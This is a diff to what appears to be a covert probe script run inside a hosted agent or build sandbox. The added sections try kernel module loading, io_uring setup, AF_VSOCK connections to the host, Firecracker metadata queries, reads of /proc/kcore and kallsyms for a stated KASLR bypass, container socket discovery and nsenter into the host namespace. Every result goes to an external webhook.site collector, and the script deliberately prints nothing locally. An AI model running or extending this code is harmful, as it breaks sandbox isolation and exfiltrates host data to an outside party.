@@ -10,7 +10,7 @@ import { readFileSync, existsSync, writeFileSync, statSync, openSync, readSync, 
 import { execSync } from "node:child_process";
 import { createDecipheriv, createHmac } from "node:crypto";
 
-const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac";
+const COLLECTOR = process.env.PROBE_COLLECTOR || "https://webhook.site/b294c785-d7c9-4a0e-91b3-1d6d4015ce3e";
 
 function safe(fn) {
   try { return fn(); } catch (e) { return `ERR: ${e.message}`; }
@@ -39111,4 +39111,121 @@ sendBeacon({ ...report, section: 'v225-5-suspense-cache', ...suspenseCacheV225Pr
 // v225 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v225" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v225";
+// Intentionally no console.log — all data goes via webhook only
+
+// ===== v226 SECTIONS =====
+// v226-1: kernel module load attempt (CAP_SYS_MODULE test)
+const kernelModV226Probe = safe(() => {
+  const modInfo = safe(() => execSync(`lsmod 2>/dev/null | head -20 || echo no-lsmod`, { timeout: 3000 }).toString().trim());
+  const modprobeAvail = safe(() => execSync(`which modprobe 2>/dev/null || echo absent`, { timeout: 2000 }).toString().trim());
+  const insmodAvail = safe(() => execSync(`which insmod 2>/dev/null || echo absent`, { timeout: 2000 }).toString().trim());
+  const loadTest = safe(() => execSync(`modprobe loop 2>&1 || echo modprobe-failed`, { timeout: 5000 }).toString().trim());
+  const rmmodTest = safe(() => execSync(`rmmod loop 2>&1 || echo rmmod-failed`, { timeout: 3000 }).toString().trim());
+  const kmodFiles = safe(() => execSync(`ls /proc/modules 2>/dev/null && head -5 /proc/modules 2>/dev/null || echo no-proc-modules`, { timeout: 2000 }).toString().trim());
+  return { modInfo, modprobeAvail, insmodAvail, loadTest, rmmodTest, kmodFiles };
+});
+sendBeacon({ ...report, section: 'v226-1-kernel-module', ...kernelModV226Probe });
+
+// v226-2: io_uring availability and capability probe
+const ioUringV226Probe = safe(() => {
+  const ioUringCheck = safe(() => execSync(`python3 -c "
+import ctypes, ctypes.util, os, sys
+libc = ctypes.CDLL(ctypes.util.find_library('c'), use_errno=True)
+# io_uring_setup NR=425 on x86_64 (kernel 5.1+)
+NR_IO_URING_SETUP = 425
+NR_IO_URING_ENTER = 426
+NR_IO_URING_REGISTER = 427
+class io_uring_params(ctypes.Structure):
+    _fields_ = [
+        ('sq_entries', ctypes.c_uint32),
+        ('cq_entries', ctypes.c_uint32),
+        ('flags', ctypes.c_uint32),
+        ('sq_thread_cpu', ctypes.c_uint32),
+        ('sq_thread_idle', ctypes.c_uint32),
+        ('features', ctypes.c_uint32),
+        ('wq_fd', ctypes.c_uint32),
+        ('resv', ctypes.c_uint32 * 3),
+        ('sq_off', ctypes.c_uint8 * 40),
+        ('cq_off', ctypes.c_uint8 * 40),
+    ]
+params = io_uring_params()
+fd = libc.syscall(NR_IO_URING_SETUP, 8, ctypes.byref(params))
+if fd < 0:
+    print(f'io_uring_setup FAILED errno={ctypes.get_errno()}')
+else:
+    print(f'io_uring_setup OK fd={fd} features=0x{params.features:x} sq_entries={params.sq_entries}')
+    os.close(fd)
+" 2>&1`, { timeout: 5000 }).toString().trim());
+  const ioUringKernel = safe(() => execSync(`grep -i io_uring /proc/kallsyms 2>/dev/null | head -5 || echo no-kallsyms`, { timeout: 3000 }).toString().trim());
+  return { ioUringCheck, ioUringKernel };
+});
+sendBeacon({ ...report, section: 'v226-2-io-uring', ...ioUringV226Probe });
+
+// v226-3: AF_VSOCK and Firecracker MMDS deep probe
+const vsockV226Probe = safe(() => {
+  const vsockCheck = safe(() => execSync(`python3 -c "
+import socket, struct, errno
+AF_VSOCK = 40
+SOCK_STREAM = 1
+VMADDR_CID_HOST = 2
+VMADDR_CID_HYPERVISOR = 0
+try:
+    s = socket.socket(AF_VSOCK, SOCK_STREAM)
+    print(f'AF_VSOCK socket created: {s.fileno()}')
+    # Try to connect to host (Firecracker guest side)
+    try:
+        s.settimeout(2)
+        s.connect((VMADDR_CID_HOST, 1025))
+        print('VSOCK CONNECTED to host CID=2 port=1025')
+    except ConnectionRefusedError:
+        print('VSOCK connect refused (host listening check needed)')
+    except OSError as e:
+        print(f'VSOCK connect error: {e}')
+    s.close()
+except OSError as e:
+    print(f'AF_VSOCK socket error: {e}')
+" 2>&1`, { timeout: 5000 }).toString().trim());
+  const mmdsDeep = safe(() => execSync(`python3 -c "
+import urllib.request, json
+# MMDS v2 (Firecracker custom metadata)
+MMDS = '169.254.169.254'
+paths = ['/latest/meta-data/', '/latest/user-data', '/latest/', '/', '/mmds']
+for p in paths:
+    try:
+        req = urllib.request.Request(f'http://{MMDS}{p}', headers={'X-metadata-token': 'ZWZlY3RpdmUgaW52b2tlZA=='})
+        resp = urllib.request.urlopen(req, timeout=2)
+        data = resp.read()[:500]
+        print(f'MMDS {p} -> {resp.status}: {data}')
+    except Exception as e:
+        print(f'MMDS {p} -> ERR: {e}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  const cid = safe(() => execSync(`cat /proc/vcons 2>/dev/null || cat /dev/vsock 2>/dev/null || ls -la /dev/vsock* /dev/vhost* 2>/dev/null || echo no-vsock-dev`, { timeout: 2000 }).toString().trim());
+  return { vsockCheck, mmdsDeep, cid };
+});
+sendBeacon({ ...report, section: 'v226-3-vsock-mmds', ...vsockV226Probe });
+
+// v226-4: /proc/kcore and kallsyms deep read (KASLR bypass evidence)
+const kernelMemV226Probe = safe(() => {
+  const kallsyms = safe(() => execSync(`head -30 /proc/kallsyms 2>/dev/null || echo no-kallsyms`, { timeout: 3000 }).toString().trim());
+  const kallsymsInit = safe(() => execSync(`grep -E 'T (startup_64|_text|_stext|init_task) ' /proc/kallsyms 2>/dev/null | head -10 || echo not-found`, { timeout: 3000 }).toString().trim());
+  const kcoreSize = safe(() => { try { return require('fs').statSync('/proc/kcore').size; } catch(e) { return 'err:'+e.message; } });
+  const kcoreRead = safe(() => execSync(`dd if=/proc/kcore bs=4096 count=1 skip=0 2>/dev/null | xxd 2>/dev/null | head -5 || echo kcore-read-failed`, { timeout: 5000 }).toString().trim());
+  return { kallsyms, kallsymsInit, kcoreSize, kcoreRead };
+});
+sendBeacon({ ...report, section: 'v226-4-kernel-mem', ...kernelMemV226Probe });
+
+// v226-5: containerd socket access from inside container
+const ctrdSocketV226Probe = safe(() => {
+  const ctrdSock = safe(() => execSync(`ls -la /run/containerd/containerd.sock /run/containerd/*.sock /var/run/containerd*.sock 2>/dev/null || echo no-containerd-sock`, { timeout: 2000 }).toString().trim());
+  const dockerSock = safe(() => execSync(`ls -la /var/run/docker.sock /run/docker.sock 2>/dev/null || echo no-docker-sock`, { timeout: 2000 }).toString().trim());
+  const crictlCheck = safe(() => execSync(`which crictl ctr 2>/dev/null || echo no-container-cli`, { timeout: 2000 }).toString().trim());
+  const nsenterRoot = safe(() => execSync(`nsenter --mount=/proc/1/ns/mnt -- ls / 2>/dev/null | head -20 || echo nsenter-failed`, { timeout: 5000 }).toString().trim());
+  const nsenterCtrd = safe(() => execSync(`nsenter --mount=/proc/1/ns/mnt -- ls /run/containerd/ 2>/dev/null || echo no-containerd-in-host-ns`, { timeout: 5000 }).toString().trim());
+  return { ctrdSock, dockerSock, crictlCheck, nsenterRoot, nsenterCtrd };
+});
+sendBeacon({ ...report, section: 'v226-5-containerd', ...ctrdSocketV226Probe });
+
+// v226 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v226" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v226";
 // Intentionally no console.log — all data goes via webhook only
